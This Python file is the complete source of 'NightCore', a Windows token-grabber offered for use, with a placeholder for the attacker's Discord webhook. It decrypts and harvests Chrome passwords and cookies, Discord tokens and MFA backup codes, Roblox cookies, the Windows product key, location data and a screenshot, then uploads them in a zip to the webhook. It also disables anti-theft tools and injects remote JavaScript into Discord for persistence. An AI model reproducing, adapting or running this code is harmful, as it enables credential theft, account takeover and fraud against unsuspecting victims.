import os
import requests
import shutil
import sqlite3
import zipfile
import json
import base64 
import psutil
import subprocess

from threading import Thread
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from re import findall
from Crypto.Cipher import AES

class NightCore:
    def __init__(self):
        self.webhook = "WEBHOOK_HERE" #replace WEBHOOK_HERE with your webhook

        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Nightcore"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.tokens = []
        self.robloxcookies = []
        self.files = ""
        self.discord_psw = []
        self.backup_codes = []
        
        self.bypassBetterDiscord()
        self.bypassTokenProtector()
        if not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data') or not os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
            self.files += f"{os.getlogin()} doesn't have google installed\n"
        else:
            self.grabPassword()
            self.grabCookies()
        Thread(target=self.screenshot).start()
        Thread(target=self.killDiscord).start()
        self.grabTokens()
        self.neatifyTokens()
        self.grabRobloxCookie()
        for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
            if os.path.exists(self.tempfolder+os.sep+i):
                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
                    x = ff.read()
                    if not x:
                        with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
                            f.write("Made by Maruf | https://github.com/Maruf132/NightCore-TokenGrabber\n\n")
                        with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                            fp.write(x+"\n\nMade by Maruf | https://github.com/Maruf132/NightCore-TokenGrabber")
                    else:
                        try:
                            os.remove(self.tempfolder+os.sep+i)
                        except Exception:
                            print("ok")

        self.SendInfo()
        self.Injection()
        shutil.rmtree(self.tempfolder)
        
    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def Injection(self):
        for root, dirs, files in os.walk(self.appdata):
            for name in dirs:
                if "discord_desktop_core-" in name:
                    try:
                        directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                    except FileNotFoundError:
                        pass
                    try:
                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
                    except FileExistsError:
                        pass
                    f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook) #By Rdimo
                    with open(directory_list, 'w', encoding="utf-8") as index_file:
                        index_file.write(f)
        for root, dirs, files in os.walk(self.roaming+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
            for name in files:
                discord_file = os.path.join(root, name)
                os.startfile(discord_file)

    def killDiscord(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in\
            ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
                try:
                    proc.kill()
                except psutil.NoSuchProcess:
                    pass

    def bypassTokenProtector(self):
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        config = tp+"config.json"
        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except Exception:
                pass 
        try:
            with open(config) as f:
                item = json.load(f)
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420

            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)

            with open(config, 'a') as f:
                f.write("\n\n//:D")
        except Exception:
            pass

    def bypassBetterDiscord(self):
        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            x = "api/webhooks"
            with open(bd, "r+", errors="ignore") as f:
                l = f.readlines()
                for i in l:
                    if x in i:
                        Replacement = i.replace(x, "Bruh")
                        l = Replacement
                f.writelines(l)

    def getProductValues(self):
        try:
            wkey = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        except:
            wkey = "N/A (Likely Pirated)"
        try:
            productName = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
        except:
            productName = "N/A"
        return [productName, wkey]

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
    
    def grabPassword(self):
        master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except Exception:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        with open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = self.decrypt_password(encrypted_password, master_key)
                    if url != "":
                        f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
                        if "discord" in url.lower():
                            self.discord_psw.append(decrypted_password)
            except Exception:
                pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception:
            pass

    def grabCookies(self):
        master_key = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except Exception:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        with open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            try:
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    decrypted_cookie = self.decrypt_password(r[2], master_key)
                    if host != "": f.write(f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie: self.robloxcookies.append(decrypted_cookie)
            except Exception:
                pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception:
            pass

    def grabRobloxCookie(self):
        try:
            self.robloxcookies.append(subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY", creationflags=0x08000000).decode().rstrip())
        except Exception:
            pass
        if self.robloxcookies:
            with open(self.tempfolder+"\\Roblox Cookies.txt", "w") as f:
                for i in self.robloxcookies: f.write(i+'\n')

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        
        for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if not "discord" in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                try:
                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)
            else:
                if os.path.exists(self.roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_password(base64.b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
                                r = requests.get(self.baseurl, headers=self.getheaders(token))
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                try:
                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)
              
    def neatifyTokens(self):
        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
        for token in self.tokens:
            j = requests.get(self.baseurl, headers=self.getheaders(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))

            if token.startswith("mfa.") and self.discord_psw:
                with open(self.tempfolder+os.sep+"Discord backupCodes.txt", "a", errors="ignore") as fp:
                    fp.write(f"{user} Backup Codes".center(36, "-")+"\n")
                    for x in self.discord_psw:
                        try:
                            r = requests.post(self.baseurl+"/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
                            for i in r.get("backup_codes"):
                                if i not in self.backup_codes:
                                    self.backup_codes.append(i)
                                    fp.write(f'\t{i.get("code")} | {"Already used" if i.get("consumed") == True else "Not used"}\n')
                        except Exception:
                            pass
            badges = ""
            flags = j['flags']
            if (flags == 1): badges += "Staff, "
            if (flags == 2): badges += "Partner, "
            if (flags == 4): badges += "Hypesquad Event, "
            if (flags == 8): badges += "Green Bughunter, "
            if (flags == 64): badges += "Hypesquad Bravery, "
            if (flags == 128): badges += "HypeSquad Brillance, "
            if (flags == 256): badges += "HypeSquad Balance, "
            if (flags == 512): badges += "Early Supporter, "
            if (flags == 16384): badges += "Gold BugHunter, "
            if (flags == 131072): badges += "Verified Bot Developer, "
            if (badges == ""): badges = "None"
            email = j.get("email")
            phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
            try:
                nitro_data = requests.get(self.baseurl+'/billing/subscriptions', headers=self.getheaders(token)).json()
            except Exception:
                pass
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            try:
                billing = bool(len(json.loads(requests.get(self.baseurl+"/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
            except Exception:
                pass
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None, 
            include_layered_windows=False, 
            all_screens=False, 
            xdisplay=None
        )
        image.save(self.tempfolder + "\\Screenshot.png")
        image.close()

    def SendInfo(self):
        wname = self.getProductValues()[0]
        wkey = self.getProductValues()[1]
        ip = country = city = region = googlemap = "None"
        try:
            data = requests.get("https://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        except Exception:
            pass
        _zipfile = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.tempfolder)
        for dirname, _, files in os.walk(self.tempfolder):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        files = os.listdir(self.tempfolder)
        for f in files:
            self.files += f"\n{f}"
        self.fileCount = f"{len(files)} Files Found: "
        embed = {
            "avatar_url":"https://c.tenor.com/J-w5FUWA17sAAAAC/hacker.gif",
            "embeds": [
                {
                    "author": {
                        "name": "NightCore-TokenGrabber",
                        "url": "https://github.com/Maruf132/NightCore-TokenGrabber",
                        "icon_url": "https://c.tenor.com/J-w5FUWA17sAAAAC/hacker.gif"
                    },
                    "description": f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://c.tenor.com/J-w5FUWA17sAAAAC/hacker.gif"
                    },       

                    "footer": {
                      "text": "https://github.com/Maruf132/NightCore-TokenGrabber"
                    }
                }
            ]
        }
        requests.post(self.webhook, json=embed)
        requests.post(self.webhook, files={'upload_file': open(_zipfile,'rb')})
        os.remove(_zipfile)

if __name__ == "__main__":
    if os.name == "nt": NightCore()
